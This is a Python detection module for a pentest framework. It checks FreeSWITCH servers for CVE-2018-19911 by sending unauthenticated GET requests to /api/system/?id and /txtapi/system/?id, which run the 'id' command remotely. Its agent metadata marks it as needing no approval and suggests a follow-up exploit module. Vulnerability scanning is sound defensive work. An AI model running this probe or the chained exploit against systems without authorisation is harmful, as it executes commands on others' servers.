#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FreeSWITCH unauthenticated /api/system command execution (CVE-2018-19911)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FreeSWITCH - /api/system RCE Detection (CVE-2018-19911)',
        'description': (
            'Detects CVE-2018-19911 by requesting /api/system/?id (and related paths) and '
            'looking for uid= in the response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'freeswitch', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/freeswitch_cve_2018_19911_rce',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2018-19911'],
        'cve': 'CVE-2018-19911',
    }

    base_path = OptString('', 'Optional FreeSWITCH HTTP base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        for api in ('/api/system', '/txtapi/system'):
            path = f'{self._prefix()}{api}/?id'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='FreeSWITCH /api/system RCE (CVE-2018-19911)',
                    path=path,
                )
                return True
        return False
